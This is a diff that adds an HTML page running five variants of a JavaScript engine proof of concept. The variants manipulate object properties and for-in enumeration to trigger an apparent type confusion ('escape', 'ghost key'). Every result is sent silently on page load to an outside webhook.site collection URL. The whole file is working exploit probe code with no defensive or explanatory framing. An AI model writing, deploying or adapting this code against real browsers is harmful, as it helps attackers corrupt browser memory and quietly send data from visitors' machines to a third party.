@@ -1,0 +1,101 @@
+<html><body><script>
+const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+}
+
+function setup() {
+  const object1 = {a:1};
+  const object2 = {a:1, b:1};
+  const object3 = {a:1, b:1, c:1};
+  Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+  const object4 = {a:1, b:1, c:1, d:1};
+  for (let key in object3) { }
+  delete object3.d;
+  return {object1, object2, object3, object4};
+}
+
+// V1: Original PoC (natives-style warm)
+function v1() {
+  const {object1, object2, object4} = setup();
+  let escape;
+  function trigger(cb) {
+    for (let key in object2) {
+      cb();
+      escape = object2[key];
+    }
+  }
+  trigger(_ => _);
+  trigger(_ => _);
+  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
+  return typeof escape + ':' + escape;
+}
+
+// V2: High warm
+function v2() {
+  const {object1, object2, object4} = setup();
+  let escape;
+  function trigger(cb) {
+    for (let key in object2) {
+      cb();
+      escape = object2[key];
+    }
+  }
+  for (let i = 0; i < 200000; i++) trigger(_ => _);
+  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
+  return typeof escape + ':' + escape;
+}
+
+// V3: Count keys in for-in (direct ghost key detection)
+function v3() {
+  const {object2, object4} = setup();
+  object4.c = 1.1;
+  let count = 0;
+  for (let k in object2) { count++; }
+  return count + ' keys';
+}
+
+// V4: Original + count all keys
+function v4() {
+  const {object1, object2, object4} = setup();
+  let escape;
+  let count = 0;
+  let keys = [];
+  function trigger(cb) {
+    for (let key in object2) {
+      cb();
+      escape = object2[key];
+      keys.push(key);
+    }
+  }
+  trigger(_ => _);
+  trigger(_ => _);
+  keys = [];
+  trigger(function () { object4.c = 1.1; for (let k in object1) { } });
+  return keys.join(',') + ' e=' + typeof escape + ':' + escape;
+}
+
+// V5: For-in inside hot loop (OSR)
+function v5() {
+  const {object1, object2, object4} = setup();
+  let escape;
+  let count = 0;
+  for (let i = 0; i < 50000; i++) {
+    for (let key in object2) {
+      if (i === 49999) {
+        object4.c = 1.1;
+        for (let k in object1) { }
+      }
+      escape = object2[key];
+    }
+  }
+  return typeof escape + ':' + escape;
+}
+
+beacon('v1', v1());
+beacon('v2', v2());
+beacon('v3', v3());
+beacon('v4', v4());
+beacon('v5', v5());
+beacon('done', 'all');
+</script></body></html>
